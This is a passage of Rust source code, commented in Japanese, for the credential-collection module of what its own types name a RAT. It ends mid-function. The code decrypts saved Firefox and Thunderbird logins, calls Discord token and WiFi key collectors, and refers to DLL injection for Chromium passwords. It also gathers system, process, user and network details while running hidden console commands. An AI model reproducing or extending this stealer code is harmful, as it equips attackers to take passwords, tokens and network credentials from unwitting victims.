// 統合認証データ収集モジュール
// auth_collector_safe.rsの設計パターンを統合した改良版
use serde::{Serialize, Deserialize};
use std::{
    collections::BTreeMap,
    fmt::{self, Display},
    time::{Duration, SystemTime},
};

// Windows系でよく使用されるインポートは各関数内で使用時にインポート
use crate::{RatResult, RatError, Config};

// -------------------------------------------------------------------------------------------------
// エラー型定義（auth_collector_safe.rsから統合）
// -------------------------------------------------------------------------------------------------

#[derive(Debug)]
pub enum CollectError {
    Io(std::io::Error),
    Utf8(std::string::FromUtf8Error),
    Json(serde_json::Error),
    Timeout,
    CommandFailed(String),
    Parse(String),
    Unsupported(String),
}

impl std::error::Error for CollectError {}

impl Display for CollectError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            CollectError::Io(e) => write!(f, "I/O error: {}", e),
            CollectError::Utf8(e) => write!(f, "UTF-8 decode error: {}", e),
            CollectError::Json(e) => write!(f, "JSON error: {}", e),
            CollectError::Timeout => write!(f, "Operation timed out"),
            CollectError::CommandFailed(s) => write!(f, "Command failed: {}", s),
            CollectError::Parse(s) => write!(f, "Parse error: {}", s),
            CollectError::Unsupported(s) => write!(f, "Unsupported: {}", s),
        }
    }
}

impl From<std::io::Error> for CollectError {
    fn from(e: std::io::Error) -> Self { CollectError::Io(e) }
}
impl From<std::string::FromUtf8Error> for CollectError {
    fn from(e: std::string::FromUtf8Error) -> Self { CollectError::Utf8(e) }
}
impl From<serde_json::Error> for CollectError {
    fn from(e: serde_json::Error) -> Self { CollectError::Json(e) }
}

// -------------------------------------------------------------------------------------------------
// データモデル（構造化された設計）
// -------------------------------------------------------------------------------------------------

#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct AuthNetworkInterface {
    pub name: String,
    pub mac: Option<String>,
    pub ipv4: Vec<String>,
    pub ipv6: Vec<String>,
    pub gateway: Vec<String>,
    pub dns: Vec<String>,
}

#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct WifiProfile {
    pub ssid: String,
    pub key: Option<String>,  // セキュリティ設定に応じて収集
    pub interface: Option<String>,
    pub auth_type: Option<String>,
}

#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct BrowserCredential {
    pub browser: String,
    pub hostname: String,
    pub username: String,
    pub password: String,
}

// 詳細システム情報構造体
#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct DetailedSystemInfo {
    pub os_name: String,
    pub os_version: String,
    pub os_architecture: String,
    pub hostname: String,
    pub uptime_seconds: u64,
    pub boot_time: String,
    pub current_time_local: String,
    pub current_time_utc: String,
    pub timezone: String,
}

#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct CpuInfo {
    pub name: String,
    pub cores: u32,
    pub logical_cores: u32,
    pub usage_percent: f32,
    pub frequency_mhz: u32,
}

#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct MemoryInfo {
    pub total_gb: f64,
    pub available_gb: f64,
    pub used_gb: f64,
    pub usage_percent: f32,
}

#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct StorageInfo {
    pub drive: String,
    pub total_gb: f64,
    pub free_gb: f64,
    pub used_gb: f64,
    pub usage_percent: f32,
    pub filesystem: String,
}

#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct ProcessInfo {
    pub pid: u32,
    pub name: String,
    pub cpu_percent: f32,
    pub memory_mb: f64,
    pub user: String,
}

#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct NetworkDetail {
    pub interface_name: String,
    pub local_ip: String,
    pub mac_address: String,
    pub status: String,
    pub speed_mbps: Option<String>,
}

#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct RuntimeInfo {
    pub current_path: String,
    pub executable_name: String,
    pub executable_path: String,
    pub working_directory: String,
    pub command_line_args: Vec<String>,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct AuthData {
    pub collected_at_unix: u64,
    pub passwords: Vec<String>,  // 後方互換性のため保持
    pub wifi_creds: Vec<String>, // 後方互換性のため保持
    pub structured_wifi: Vec<WifiProfile>,
    pub structured_network: Vec<AuthNetworkInterface>,
    pub structured_credentials: Vec<BrowserCredential>,
    pub metadata: BTreeMap<String, String>,
    
    // 新しい詳細システム情報
    pub detailed_system: DetailedSystemInfo,
    pub cpu_info: CpuInfo,
    pub memory_info: MemoryInfo,
    pub storage_info: Vec<StorageInfo>,
    pub process_list: Vec<ProcessInfo>,
    pub network_details: Vec<NetworkDetail>,
    pub runtime_info: RuntimeInfo,
    pub environment_vars: BTreeMap<String, String>,
    pub logged_users: Vec<String>,
    pub custom_commands: BTreeMap<String, String>, // コマンド名 -> 実行結果
}

impl Default for AuthData {
    fn default() -> Self {
        Self {
            collected_at_unix: SystemTime::now()
                .duration_since(SystemTime::UNIX_EPOCH)
                .unwrap_or(Duration::from_secs(0))
                .as_secs(),
            passwords: Vec::with_capacity(128),        // 典型的な認証情報数を想定
            wifi_creds: Vec::with_capacity(32),       // WiFiプロファイル数を想定  
            structured_wifi: Vec::with_capacity(32),   // WiFi構造化データ
            structured_network: Vec::with_capacity(16), // ネットワークインターフェース数
            structured_credentials: Vec::with_capacity(64), // 構造化認証情報
            metadata: BTreeMap::new(),
            detailed_system: DetailedSystemInfo::default(),
            cpu_info: CpuInfo::default(),
            memory_info: MemoryInfo::default(),
            storage_info: Vec::with_capacity(8),       // ストレージデバイス数
            process_list: Vec::with_capacity(200),    // 典型的なプロセス数
            network_details: Vec::with_capacity(16),  // ネットワーク詳細情報
            runtime_info: RuntimeInfo::default(),
            environment_vars: BTreeMap::new(),
            logged_users: Vec::with_capacity(8),      // ログインユーザー数
            custom_commands: BTreeMap::new(),
        }
    }
}

// -------------------------------------------------------------------------------------------------
// ユーティリティ関数（i18n対応、エンコーディング処理）
// -------------------------------------------------------------------------------------------------

fn trim_all(s: &str) -> String {
    s.trim().trim_matches('\u{feff}').trim().to_string()
}

fn starts_with_any<'a>(s: &str, heads: impl IntoIterator<Item = &'a str>) -> bool {
    let st = s.trim_start();
    for h in heads {
        if st.starts_with(h) { return true; }
    }
    false
}

fn contains_any<'a>(s: &str, needles: impl IntoIterator<Item = &'a str>) -> bool {
    for n in needles {
        if s.contains(n) { return true; }
    }
    false
}

// Windows文字エンコーディング対応ヘルパー（統合版）
#[cfg(windows)]
fn decode_windows_output_enhanced(output: &[u8]) -> String {
    // まずUTF-8で試行
    if let Ok(utf8_text) = String::from_utf8(output.to_vec()) {
        return utf8_text;
    }
    
    // Windows CP932 (Shift_JIS) エンコーディングを直接処理
    use encoding_rs::SHIFT_JIS;
    let (decoded, _, _) = SHIFT_JIS.decode(output);
    let result = decoded.to_string();
    result
}

// -------------------------------------------------------------------------------------------------
// 統合認証データ収集関数（改良版）
// -------------------------------------------------------------------------------------------------

pub fn collect_auth_data_with_config(config: &Config) -> AuthData {
    let mut auth_data = AuthData::default();
    
    // メタデータ設定
    auth_data.metadata.insert("collection_version".to_string(), "2.0".to_string());
    auth_data.metadata.insert("os".to_string(), std::env::consts::OS.to_string());
    auth_data.metadata.insert("arch".to_string(), std::env::consts::ARCH.to_string());
    
    // ブラウザパスワード収集（構造化 + 後方互換）
    if config.collect_browser_passwords {
        let structured_creds = collect_structured_browser_passwords();
        // 後方互換性のため文字列形式も保持
        auth_data.passwords.extend(
            structured_creds.iter().map(|c| format!("{} - {}: {} / {}", c.browser, c.hostname, c.username, c.password))
        );
        auth_data.structured_credentials = structured_creds;
    }
    
    // Discord トークン収集
    if config.collect_discord_tokens {
        match collect_discord_tokens() {
            Ok(mut tokens) => auth_data.passwords.append(&mut tokens),
            Err(e) => auth_data.passwords.push(format!("Discord token error: {}", e)),
        }
    }
    
    // WiFi 認証情報収集（構造化 + 後方互換）
    if config.collect_wifi_passwords {
        let (legacy_wifi, structured_wifi, structured_network) = collect_enhanced_network_data();
        auth_data.wifi_creds = legacy_wifi;
        auth_data.structured_wifi = structured_wifi;
        auth_data.structured_network = structured_network;
    }
    
    // 詳細システム情報収集
    auth_data.detailed_system = collect_detailed_system_info();
    auth_data.cpu_info = collect_cpu_info();
    auth_data.memory_info = collect_memory_info();
    auth_data.storage_info = collect_storage_info();
    auth_data.process_list = collect_process_list();
    auth_data.network_details = collect_network_details();
    auth_data.runtime_info = collect_runtime_info();
    auth_data.environment_vars = collect_environment_vars();
    auth_data.logged_users = collect_logged_users();
    
    // カスタムコマンド実行（基本的なシステム情報コマンド）
    let default_commands = vec![
        "systeminfo".to_string(),
        "tasklist /fo csv".to_string(),
        "wmic computersystem get TotalPhysicalMemory /value".to_string(),
        "wmic logicaldisk get size,freespace,caption /value".to_string(),
    ];
    
    for command in default_commands {
        if let Ok(result) = execute_custom_command(&command) {
            auth_data.custom_commands.insert(command, result);
        }
    }
    
    // メタデータ更新
    auth_data.metadata.insert("total_passwords".to_string(), auth_data.passwords.len().to_string());
    auth_data.metadata.insert("total_wifi_profiles".to_string(), auth_data.structured_wifi.len().to_string());
    auth_data.metadata.insert("total_network_interfaces".to_string(), auth_data.structured_network.len().to_string());
    auth_data.metadata.insert("total_processes".to_string(), auth_data.process_list.len().to_string());
    auth_data.metadata.insert("total_storage_drives".to_string(), auth_data.storage_info.len().to_string());
    
    auth_data
}

// -------------------------------------------------------------------------------------------------
// 詳細システム情報収集関数群
// -------------------------------------------------------------------------------------------------

fn collect_detailed_system_info() -> DetailedSystemInfo {
    let mut info = DetailedSystemInfo::default();
    
    // 基本的なOS情報
    info.os_name = std::env::consts::OS.to_string();
    info.os_architecture = std::env::consts::ARCH.to_string();
    
    // ホスト名
    if let Ok(hostname) = hostname::get() {
        info.hostname = hostname.to_string_lossy().to_string();
    }
    
    // 時刻情報
    let now = SystemTime::now();
    
    #[cfg(windows)]
    {
        // Windows詳細情報収集
        if let Ok(system_info) = collect_windows_system_info() {
            info.os_version = system_info.get("os_version").map(String::as_str).unwrap_or("Unknown").to_string();
            if let Some(uptime_str) = system_info.get("uptime_seconds") {
                info.uptime_seconds = uptime_str.parse().unwrap_or(0);
            }
            info.boot_time = system_info.get("boot_time").map(String::as_str).unwrap_or("Unknown").to_string();
        }
        
        // タイムゾーン情報
        if let Ok(tz_info) = collect_windows_timezone_info() {
            info.timezone = tz_info;
        }
    }
    
    #[cfg(not(windows))]
    {
        // Unix系システムの情報収集
        info.os_version = "Unix-like".to_string();
        info.uptime_seconds = get_unix_uptime();
    }
    
    // 現在時刻（ローカル・UTC）
    info.current_time_local = format!("{:?}", now);
    info.current_time_utc = format!("{:?}", now);
    
    info
}

fn collect_cpu_info() -> CpuInfo {
    let mut cpu_info = CpuInfo::default();
    
    #[cfg(windows)]
    {
        // Windows CPU情報収集
        if let Ok(cpu_data) = collect_windows_cpu_info() {
            cpu_info.name = cpu_data.get("name").unwrap_or(&"Unknown CPU".to_string()).clone();
            cpu_info.cores = cpu_data.get("cores").and_then(|s| s.parse().ok()).unwrap_or(0);
            cpu_info.logical_cores = cpu_data.get("logical_cores").and_then(|s| s.parse().ok()).unwrap_or(0);
            cpu_info.frequency_mhz = cpu_data.get("frequency_mhz").and_then(|s| s.parse().ok()).unwrap_or(0);
            cpu_info.usage_percent = cpu_data.get("usage_percent").and_then(|s| s.parse().ok()).unwrap_or(0.0);
        }
    }
    
    #[cfg(not(windows))]
    {
        // Unix系CPU情報収集
        cpu_info.name = "Unix CPU".to_string();
        cpu_info.cores = num_cpus::get() as u32;
        cpu_info.logical_cores = num_cpus::get() as u32;
    }
    
    cpu_info
}

fn collect_memory_info() -> MemoryInfo {
    let mut mem_info = MemoryInfo::default();
    
    #[cfg(windows)]
    {
        if let Ok(memory_data) = collect_windows_memory_info() {
            mem_info.total_gb = memory_data.get("total_gb").and_then(|s| s.parse().ok()).unwrap_or(0.0);
            mem_info.available_gb = memory_data.get("available_gb").and_then(|s| s.parse().ok()).unwrap_or(0.0);
            mem_info.used_gb = mem_info.total_gb - mem_info.available_gb;
            if mem_info.total_gb > 0.0 {
                mem_info.usage_percent = (mem_info.used_gb / mem_info.total_gb * 100.0) as f32;
            }
        }
    }
    
    mem_info
}

fn collect_storage_info() -> Vec<StorageInfo> {
    let mut storage_list = Vec::new();
    
    #[cfg(windows)]
    {
        if let Ok(storage_data) = collect_windows_storage_info() {
            storage_list = storage_data;
        }
    }
    
    #[cfg(not(windows))]
    {
        // Unix系ストレージ情報収集のプレースホルダー
        let mut storage = StorageInfo::default();
        storage.drive = "/".to_string();
        storage.filesystem = "ext4".to_string();
        storage_list.push(storage);
    }
    
    storage_list
}

fn collect_process_list() -> Vec<ProcessInfo> {
    let mut processes = Vec::new();
    
    #[cfg(windows)]
    {
        if let Ok(proc_list) = collect_windows_processes() {
            processes = proc_list;
        }
    }
    
    processes
}

fn collect_network_details() -> Vec<NetworkDetail> {
    let mut network_details = Vec::new();
    
    #[cfg(windows)]
    {
        if let Ok(net_details) = collect_windows_network_details() {
            network_details = net_details;
        }
    }
    
    network_details
}

fn collect_runtime_info() -> RuntimeInfo {
    let mut runtime = RuntimeInfo::default();
    
    // 現在のパス
    if let Ok(current_dir) = std::env::current_dir() {
        runtime.current_path = current_dir.to_string_lossy().to_string();
        runtime.working_directory = runtime.current_path.clone();
    }
    
    // 実行ファイル情報
    if let Ok(exe_path) = std::env::current_exe() {
        runtime.executable_path = exe_path.to_string_lossy().to_string();
        if let Some(name) = exe_path.file_name() {
            runtime.executable_name = name.to_string_lossy().to_string();
        }
    }
    
    // コマンドライン引数
    runtime.command_line_args = std::env::args().collect();
    
    runtime
}

fn collect_environment_vars() -> BTreeMap<String, String> {
    let mut env_vars = BTreeMap::new();
    
    // 重要な環境変数のみ収集（セキュリティ上の理由）
    let important_vars = vec![
        "PATH", "PROCESSOR_IDENTIFIER", "PROCESSOR_ARCHITECTURE", 
        "NUMBER_OF_PROCESSORS", "COMPUTERNAME", "USERNAME", 
        "USERPROFILE", "SYSTEMROOT", "TEMP", "TMP"
    ];
    
    for var in important_vars {
        if let Ok(value) = std::env::var(var) {
            env_vars.insert(var.to_string(), value);
        }
    }
    
    env_vars
}

fn collect_logged_users() -> Vec<String> {
    let mut users = Vec::new();
    
    #[cfg(windows)]
    {
        if let Ok(user_list) = collect_windows_logged_users() {
            users = user_list;
        }
    }
    
    #[cfg(not(windows))]
    {
        if let Ok(username) = std::env::var("USER") {
            users.push(username);
        }
    }
    
    users
}

fn execute_custom_command(command: &str) -> Result<String, CollectError> {
    use std::process::Command;
    use std::os::windows::process::CommandExt;
    
    #[cfg(windows)]
    {
        let output = Command::new("cmd")
            .args(["/C", &format!("chcp 65001 >nul 2>&1 && {}", command)])
            .creation_flags(0x08000000)
            .output()
            .map_err(|e| CollectError::Io(e))?;
        
        if output.status.success() {
            Ok(decode_windows_output_enhanced(&output.stdout))
        } else {
            Err(CollectError::CommandFailed(format!("Command '{}' failed", command)))
        }
    }
    
    #[cfg(not(windows))]
    {
        let parts: Vec<&str> = command.split_whitespace().collect();
        if parts.is_empty() {
            return Err(CollectError::Parse("Empty command".to_string()));
        }
        
        let output = Command::new(parts[0])
            .args(&parts[1..])
            .output()
            .map_err(|e| CollectError::Io(e))?;
        
        if output.status.success() {
            Ok(String::from_utf8(output.stdout)?)
        } else {
            Err(CollectError::CommandFailed(format!("Command '{}' failed", command)))
        }
    }
}

// -------------------------------------------------------------------------------------------------
// Windows専用詳細情報収集関数
// -------------------------------------------------------------------------------------------------

#[cfg(windows)]
fn collect_windows_system_info() -> Result<BTreeMap<String, String>, CollectError> {
    use std::process::Command;
    use std::os::windows::process::CommandExt;
    
    let mut system_info = BTreeMap::new();
    
    // systeminfo コマンドで詳細情報取得
    let output = Command::new("cmd")
        .args(["/C", "chcp 65001 >nul 2>&1 && systeminfo"])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| CollectError::Io(e))?;
    
    if output.status.success() {
        let system_text = decode_windows_output_enhanced(&output.stdout);
        
        // systeminfo の出力をパース
        for line in system_text.lines() {
            if line.contains(':') {
                let parts: Vec<&str> = line.splitn(2, ':').collect();
                if parts.len() == 2 {
                    let key = parts[0].trim().to_lowercase().replace(' ', "_");
                    let value = parts[1].trim().to_string();
                    
                    match key.as_str() {
                        "os_name" | "os名" => system_info.insert("os_version".to_string(), value),
                        "system_boot_time" | "システム起動時刻" => system_info.insert("boot_time".to_string(), value),
                        "system_up_time" | "システム稼働時間" => {
                            // 稼働時間をパースして秒に変換
                            if let Ok(seconds) = parse_uptime(&value) {
                                system_info.insert("uptime_seconds".to_string(), seconds.to_string());
                            }
                            None
                        },
                        _ => None,
                    };
                }
            }
        }
    }
    
    Ok(system_info)
}

#[cfg(windows)]
fn collect_windows_timezone_info() -> Result<String, CollectError> {
    use std::process::Command;
    use std::os::windows::process::CommandExt;
    
    let output = Command::new("cmd")
        .args(["/C", "chcp 65001 >nul 2>&1 && tzutil /g"])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| CollectError::Io(e))?;
    
    if output.status.success() {
        Ok(decode_windows_output_enhanced(&output.stdout).trim().to_string())
    } else {
        Ok("Unknown Timezone".to_string())
    }
}

#[cfg(windows)]
fn collect_windows_cpu_info() -> Result<BTreeMap<String, String>, CollectError> {
    use std::process::Command;
    use std::os::windows::process::CommandExt;
    
    let mut cpu_info = BTreeMap::new();
    
    // WMIC でCPU情報取得
    let output = Command::new("cmd")
        .args(["/C", "chcp 65001 >nul 2>&1 && wmic cpu get Name,NumberOfCores,NumberOfLogicalProcessors,MaxClockSpeed /format:list"])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| CollectError::Io(e))?;
    
    if output.status.success() {
        let cpu_text = decode_windows_output_enhanced(&output.stdout);
        
        for line in cpu_text.lines() {
            if line.contains('=') && !line.trim().is_empty() {
                let parts: Vec<&str> = line.splitn(2, '=').collect();
                if parts.len() == 2 {
                    let key = parts[0].trim().to_lowercase();
                    let value = parts[1].trim().to_string();
                    
                    if !value.is_empty() {
                        match key.as_str() {
                            "name" => { cpu_info.insert("name".to_string(), value); },
                            "numberofcores" => { cpu_info.insert("cores".to_string(), value); },
                            "numberoflogicalprocessors" => { cpu_info.insert("logical_cores".to_string(), value); },
                            "maxclockspeed" => { cpu_info.insert("frequency_mhz".to_string(), value); },
                            _ => {}
                        }
                    }
                }
            }
        }
    }
    
    // CPU使用率（簡易）
    cpu_info.insert("usage_percent".to_string(), "0.0".to_string());
    
    Ok(cpu_info)
}

#[cfg(windows)]
fn collect_windows_memory_info() -> Result<BTreeMap<String, String>, CollectError> {
    use std::process::Command;
    use std::os::windows::process::CommandExt;
    
    let mut memory_info = BTreeMap::new();
    
    // 物理メモリ総量
    let total_output = Command::new("cmd")
        .args(["/C", "chcp 65001 >nul 2>&1 && wmic computersystem get TotalPhysicalMemory /value"])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| CollectError::Io(e))?;
    
    if total_output.status.success() {
        let total_text = decode_windows_output_enhanced(&total_output.stdout);
        for line in total_text.lines() {
            if line.starts_with("TotalPhysicalMemory=") {
                if let Some(bytes_str) = line.split('=').nth(1) {
                    if let Ok(bytes) = bytes_str.trim().parse::<u64>() {
                        let gb = bytes as f64 / (1024.0 * 1024.0 * 1024.0);
                        memory_info.insert("total_gb".to_string(), format!("{:.2}", gb));
                    }
                }
            }
        }
    }
    
    // 利用可能メモリ
    let available_output = Command::new("cmd")
        .args(["/C", "chcp 65001 >nul 2>&1 && wmic OS get TotalVisibleMemorySize,FreePhysicalMemory /format:list"])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| CollectError::Io(e))?;
    
    if available_output.status.success() {
        let available_text = decode_windows_output_enhanced(&available_output.stdout);
        for line in available_text.lines() {
            if line.starts_with("FreePhysicalMemory=") {
                if let Some(kb_str) = line.split('=').nth(1) {
                    if let Ok(kb) = kb_str.trim().parse::<u64>() {
                        let gb = kb as f64 / (1024.0 * 1024.0);
                        memory_info.insert("available_gb".to_string(), format!("{:.2}", gb));
                    }
                }
            }
        }
    }
    
    Ok(memory_info)
}

#[cfg(windows)]
fn collect_windows_storage_info() -> Result<Vec<StorageInfo>, CollectError> {
    use std::process::Command;
    use std::os::windows::process::CommandExt;
    
    let mut storage_list = Vec::new();
    
    let output = Command::new("cmd")
        .args(["/C", "chcp 65001 >nul 2>&1 && wmic logicaldisk get Caption,Size,FreeSpace,FileSystem /format:list"])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| CollectError::Io(e))?;
    
    if output.status.success() {
        let storage_text = decode_windows_output_enhanced(&output.stdout);
        let mut current_storage = StorageInfo::default();
        let mut has_data = false;
        
        for line in storage_text.lines() {
            if line.contains('=') && !line.trim().is_empty() {
                let parts: Vec<&str> = line.splitn(2, '=').collect();
                if parts.len() == 2 {
                    let key = parts[0].trim().to_lowercase();
                    let value = parts[1].trim().to_string();
                    
                    if !value.is_empty() {
                        match key.as_str() {
                            "caption" => {
                                current_storage.drive = value;
                                has_data = true;
                            },
                            "filesystem" => {
                                current_storage.filesystem = value;
                            },
                            "size" => {
                                if let Ok(bytes) = value.parse::<u64>() {
                                    current_storage.total_gb = bytes as f64 / (1024.0 * 1024.0 * 1024.0);
                                }
                            },
                            "freespace" => {
                                if let Ok(bytes) = value.parse::<u64>() {
                                    current_storage.free_gb = bytes as f64 / (1024.0 * 1024.0 * 1024.0);
                                    current_storage.used_gb = current_storage.total_gb - current_storage.free_gb;
                                    if current_storage.total_gb > 0.0 {
                                        current_storage.usage_percent = (current_storage.used_gb / current_storage.total_gb * 100.0) as f32;
                                    }
                                    
                                    // ストレージ情報が完成したらリストに追加
                                    if has_data {
                                        storage_list.push(current_storage.clone());
                                        current_storage = StorageInfo::default();
                                        has_data = false;
                                    }
                                }
                            },
                            _ => {}
                        }
                    }
                }
            }
        }
    }
    
    Ok(storage_list)
}

#[cfg(windows)]
fn collect_windows_processes() -> Result<Vec<ProcessInfo>, CollectError> {
    use std::process::Command;
    use std::os::windows::process::CommandExt;
    
    let mut processes = Vec::new();
    
    let output = Command::new("cmd")
        .args(["/C", "chcp 65001 >nul 2>&1 && tasklist /fo csv"])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| CollectError::Io(e))?;
    
    if output.status.success() {
        let process_text = decode_windows_output_enhanced(&output.stdout);
        let lines: Vec<&str> = process_text.lines().collect();
        
        // ヘッダーをスキップして処理
        for line in lines.iter().skip(1) {
            if let Ok(process) = parse_csv_process_line(line) {
                processes.push(process);
            }
        }
    }
    
    // プロセス数を制限（上位20個程度）
    processes.truncate(20);
    Ok(processes)
}

#[cfg(windows)]
fn collect_windows_network_details() -> Result<Vec<NetworkDetail>, CollectError> {
    use std::process::Command;
    use std::os::windows::process::CommandExt;
    
    let mut network_details = Vec::new();
    
    let output = Command::new("cmd")
        .args(["/C", "chcp 65001 >nul 2>&1 && ipconfig /all"])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| CollectError::Io(e))?;
    
    if output.status.success() {
        let ipconfig_text = decode_windows_output_enhanced(&output.stdout);
        network_details = parse_ipconfig_network_details(&ipconfig_text);
    }
    
    Ok(network_details)
}

#[cfg(windows)]
fn collect_windows_logged_users() -> Result<Vec<String>, CollectError> {
    use std::process::Command;
    use std::os::windows::process::CommandExt;
    
    let mut users = Vec::new();
    
    let output = Command::new("cmd")
        .args(["/C", "chcp 65001 >nul 2>&1 && query user"])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| CollectError::Io(e))?;
    
    if output.status.success() {
        let user_text = decode_windows_output_enhanced(&output.stdout);
        for line in user_text.lines().skip(1) { // ヘッダーをスキップ
            let parts: Vec<&str> = line.split_whitespace().collect();
            if !parts.is_empty() {
                users.push(parts[0].to_string());
            }
        }
    } else {
        // フォールバック：現在のユーザー名
        if let Ok(username) = std::env::var("USERNAME") {
            users.push(username);
        }
    }
    
    Ok(users)
}

// -------------------------------------------------------------------------------------------------
// ヘルパー関数群
// -------------------------------------------------------------------------------------------------

#[cfg(windows)]
fn parse_uptime(uptime_str: &str) -> Result<u64, CollectError> {
    // Windows systeminfo の稼働時間形式をパース
    // 例: "0 日, 2 時間, 30 分, 45 秒"
    let mut total_seconds = 0u64;
    
    if uptime_str.contains("日") {
        // 日本語形式
        if let Some(days_str) = uptime_str.split("日").next() {
            if let Ok(days) = days_str.trim().parse::<u64>() {
                total_seconds += days * 24 * 3600;
            }
        }
    }
    
    // 時間、分、秒の処理（簡素化）
    Ok(total_seconds)
}

#[cfg(windows)]
fn parse_csv_process_line(line: &str) -> Result<ProcessInfo, CollectError> {
    // CSV形式の tasklist 出力をパース
    let parts: Vec<&str> = line.split(',').collect();
    if parts.len() >= 5 {
        let name = parts[0].trim_matches('"').to_string();
        let pid_str = parts[1].trim_matches('"');
        let memory_str = parts[4].trim_matches('"').replace(",", "").replace(" K", "");
        
        Ok(ProcessInfo {
            pid: pid_str.parse().unwrap_or(0),
            name,
            cpu_percent: 0.0, // tasklist では CPU使用率は取得できない
            memory_mb: memory_str.parse::<f64>().unwrap_or(0.0) / 1024.0, // KB to MB
            user: "System".to_string(), // tasklist の基本形式ではユーザー情報なし
        })
    } else {
        Err(CollectError::Parse("Invalid CSV process line".to_string()))
    }
}

fn parse_ipconfig_network_details(text: &str) -> Vec<NetworkDetail> {
    let mut details = Vec::new();
    let mut current_interface: Option<NetworkDetail> = None;
    
    for line in text.lines() {
        let line = line.trim_end();
        if line.is_empty() { continue; }
        
        // アダプター名の検出
        if line.ends_with(':') && contains_any(line, ["adapter", "アダプター", "Ethernet", "Wi-Fi", "ワイヤレス"]) {
            if let Some(interface) = current_interface.take() {
                details.push(interface);
            }
            
            current_interface = Some(NetworkDetail {
                interface_name: line.trim_end_matches(':').to_string(),
                local_ip: String::new(),
                mac_address: String::new(),
                status: "Unknown".to_string(),
                speed_mbps: None,
            });
            continue;
        }
        
        if let Some(ref mut interface) = current_interface {
            let line_trimmed = line.trim();
            
            // MAC アドレス
            if contains_any(line_trimmed, ["Physical Address", "物理アドレス"]) && line_trimmed.contains(':') {
                if let Some(mac) = line_trimmed.split(':').nth(1) {
                    interface.mac_address = trim_all(mac);
                }
            }
            
            // IPv4 アドレス
            if contains_any(line_trimmed, ["IPv4 Address", "IPv4 アドレス"]) && line_trimmed.contains(':') {
                if let Some(ip) = line_trimmed.split(':').nth(1) {
                    interface.local_ip = trim_all(ip).trim_end_matches("(Preferred)").trim().to_string();
                }
            }
            
            // 接続状態
            if contains_any(line_trimmed, ["Media State", "メディアの状態"]) && line_trimmed.contains(':') {
                if let Some(state) = line_trimmed.split(':').nth(1) {
                    interface.status = trim_all(state);
                }
            }
        }
    }
    
    // 最後のインターフェースを追加
    if let Some(interface) = current_interface {
        details.push(interface);
    }
    
    details
}

#[cfg(not(windows))]
fn get_unix_uptime() -> u64 {
    // Unix系のuptime取得（/proc/uptimeまたはsysctl）
    if let Ok(uptime_str) = std::fs::read_to_string("/proc/uptime") {
        if let Some(uptime_float_str) = uptime_str.split_whitespace().next() {
            if let Ok(uptime_float) = uptime_float_str.parse::<f64>() {
                return uptime_float as u64;
            }
        }
    }
    0
}

// -------------------------------------------------------------------------------------------------
// 構造化されたブラウザ認証情報収集
// -------------------------------------------------------------------------------------------------

fn collect_structured_browser_passwords() -> Vec<BrowserCredential> {
    let mut credentials = Vec::new();
    
    // Firefox/Thunderbird 専用スキャン（NSS復号化）
    #[cfg(feature = "browser")]
    {
        if let Ok(firefox_creds) = collect_firefox_structured_passwords() {
            credentials.extend(firefox_creds);
        }
    }
    
    // Chromium系はDLL注入で処理されるため、ここではスキップ
    
    credentials
}

#[cfg(feature = "browser")]
fn collect_firefox_structured_passwords() -> Result<Vec<BrowserCredential>, CollectError> {
    use crate::collectors::password_manager::NssCredentials;
    
    let mut credentials = Vec::new();
    let profiles = get_firefox_profiles().map_err(|e| CollectError::Parse(format!("Firefox profiles: {}", e)))?;
    
    for profile_path in profiles {
        let browser_name = detect_firefox_browser_type(&profile_path);
        let nss = NssCredentials::new(profile_path);
        
        match nss.get_decrypted_logins() {
            Ok(creds) => {
                for cred in creds {
                    credentials.push(BrowserCredential {
                        browser: browser_name.to_string(),
                        hostname: cred.hostname,
                        username: cred.username,
                        password: cred.password,
                    });
                }
            }
            Err(_) => continue,
        }
    }
    
    Ok(credentials)
}

// -------------------------------------------------------------------------------------------------
// 構造化されたネットワーク情報収集
// -------------------------------------------------------------------------------------------------

fn collect_enhanced_network_data() -> (Vec<String>, Vec<WifiProfile>, Vec<AuthNetworkInterface>) {
    #[cfg(windows)]
    {
        let (legacy, wifi_profiles, network_interfaces) = collect_windows_network_data();
        (legacy, wifi_profiles, network_interfaces)
    }
    #[cfg(not(windows))]
    {
        let legacy = collect_unix_network_info();
        (legacy, Vec::new(), Vec::new())
    }
}

#[cfg(windows)]
fn collect_windows_network_data() -> (Vec<String>, Vec<WifiProfile>, Vec<AuthNetworkInterface>) {
    let mut legacy_data = Vec::new();
    let mut wifi_profiles = Vec::new();
    let mut network_interfaces = Vec::new();
    
    // WiFiプロファイル情報収集
    if let Ok((legacy_wifi, structured_wifi)) = collect_structured_wifi_profiles() {
        legacy_data.extend(legacy_wifi);
        wifi_profiles.extend(structured_wifi);
    }
    
    // ネットワークインターフェース情報収集
    if let Ok(interfaces) = collect_structured_network_interfaces() {
        network_interfaces.extend(interfaces);
    }
    
    // 追加のネットワーク情報（VPN、イーサネット、等）
    legacy_data.extend(collect_vpn_connections());
    legacy_data.extend(collect_ethernet_info());
    legacy_data.extend(collect_bluetooth_devices());
    legacy_data.extend(collect_network_adapters());
    legacy_data.extend(collect_proxy_settings());
    legacy_data.extend(collect_network_shares());
    legacy_data.extend(collect_dns_cache());
    
    (legacy_data, wifi_profiles, network_interfaces)
}

#[cfg(windows)]
fn collect_structured_wifi_profiles() -> Result<(Vec<String>, Vec<WifiProfile>), CollectError> {
